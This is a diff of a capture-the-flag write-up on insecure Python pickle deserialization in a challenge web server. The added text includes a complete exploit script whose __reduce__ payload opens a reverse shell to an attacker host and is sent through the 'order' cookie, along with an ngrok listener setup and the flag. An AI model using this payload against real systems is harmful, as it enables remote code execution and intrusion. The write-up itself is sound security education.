@@ -6,7 +6,7 @@
 
 ## Involved Vulnerability
 
-The server of this challenge uses the Python module called *pickle*, which is used for serializing (“*Pickling*”) and de-serializing (“*Unpickling*”) Python objects' structure (see [[1]](#1)). This module is vulnerable to RCE during unpickling of class instances (objects). Classes can be defined to contain methods that can be called during unpickling process. One of these methods is *\_\_reduce()\_\_*.<br>
+The server of this challenge uses the Python module called *pickle*, which is used for serializing (“*Pickling*”) and de-serializing (“*Unpickling*”) Python objects' structure (see [[1]](#1)). This module is vulnerable to RCE during unpickling of class instances (objects). Classes can be defined to contain methods that can be called during the unpickling process to specify how they should be unpickled. One of these methods is *\_\_reduce()\_\_*.<br>
 As evidenced by [[1]](#1):<br>
 
 >The \_\_reduce\_\_() method takes no argument and shall return either a string or preferably a tuple (the returned object is often referred to as the “reduce value”).<br>
@@ -49,17 +49,56 @@ The user can create any pickled object and set the "*order*" cookie accordingly.
 
 ## Attack
 
-The behaviour to be exploited is the insecure unpickling (or insecure deserialization) of particular pickled objects. What the application does with the output of the deserialization is of no interest to the attacker. A way to exploit the involved vulnerability was to spawn a reverse shell on the server through Python code.
+The behaviour to be exploited is the insecure unpickling (or insecure deserialization) of particular pickled objects. What the application does with the output of the deserialization is of no interest to the attacker. A way to exploit the involved vulnerability was to spawn a reverse shell on the server through Python code. The *\_\_reduce\_\_()* method should be defined like this:
 
 ```python
-host="IP_Address"
+host="IP_Address"   #or "Domain_Name"
 port="PORT"
 class RCE:
     def __reduce__(self):
-        #define code here won't work
+        #code here will be executed only during pickling, not unpickling (only the return statement will be coded in pickle format).
         return (exec, ('from os import dup2;from subprocess import run; import socket; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("'+host+'",'+port+')); dup2(s.fileno(),0); dup2(s.fileno(),1); dup2(s.fileno(),2); run(["/bin/bash","-i"]);',))
 ```
-Variables <code>host</code> and <code>port</code> contain, respectively, the IP address and the port on which the attacker will listen for the spawned reverse shell. 
+Variables <code>host</code> and <code>port</code> contain, respectively, the IP address (or domain name) and the port on which the attacker will listen for the spawned reverse shell. 
+The complete exploit is the following:
+```python
+import pickle
+import base64
+import requests
+import socket
+
+host="IP_Address"   #or "Domain_Name"
+port="PORT"
+
+class RCE:
+    def __reduce__(self):
+        #code here will be executed only during pickling, not unpickling (only the return statement will be coded in the pickled object).
+        return (exec, ('from os import dup2;from subprocess import run; import socket; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("'+host+'",'+port+')); dup2(s.fileno(),0); dup2(s.fileno(),1); dup2(s.fileno(),2); run(["/bin/bash","-i"]);',))
+
+pickled_bytes=pickle.dumps(RCE())    #Object instance ---> Pickle Format
+pickled_base64_bytes = base64.b64encode(pickled_bytes)    #Pickle format ---> Base64 encoding bytes
+pickled_base64_string = pickled_base64_bytes.decode('ascii')   #Bsse64 encoding bytes ---> String format
+response=requests.get("https://pickles-web.challenges.ctf.ritsec.club/order",cookies={"order":pickled_base64_string})
+print(response.text)
+```
+In order to execute a reverse shell a service like <code>ngrok</code> can be used. In this example I will listen on port 9001 of my own machine, but, for the server, i will listen on port <code>19945</code> at <code>4.tcp.eu.ngrok.io</code> (IP address of this name can be obtained with socket.gethostbyname() function). So:
+
+![Listening_Reverse_Shell](https://user-images.githubusercontent.com/66698256/229456489-9d923751-d86a-4baf-858a-53d33d6c6ef0.png)
+
+Then i'll execute the exploit:
+
+![Exploit](https://user-images.githubusercontent.com/66698256/229456560-0757c3d6-a662-4449-b966-96bee371f049.png)
+
+![Spawned_Reverse_Shell](https://user-images.githubusercontent.com/66698256/229456613-76d66a6c-1468-4e23-8626-c1c79855f29c.png)
+
+Reverse shell spawned! The flag is at <code>/flag</code>.
+
+![Flag](https://user-images.githubusercontent.com/66698256/229458939-a3ca621a-0721-4edf-8ae2-a1709a4c9edd.png)
+
+Flag is <code>RS{TH3_L345T_53CUR3_P1CKL3}</code>.
+
+
+
 
 ## References
 <a id="1">[1]</a> 
